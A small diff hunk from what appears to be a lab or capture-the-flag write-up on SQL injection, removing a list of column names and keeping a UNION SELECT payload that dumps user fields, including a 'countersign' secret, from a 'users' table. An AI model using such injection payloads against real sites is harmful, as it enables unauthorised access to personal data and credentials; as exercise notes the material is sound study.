@@ -52,9 +52,6 @@ We get :
 - vote_dbs.subject
 
 
-user_id, first_name, last_name, town, country, planet, Commentaire, countersign
-
-
 # knowing table's columns, we can now get the data from the 'users' table itself
 0 union SELECT NULL, concat(user_id, first_name, last_name, town, country, planet, Commentaire, countersign) FROM users
 
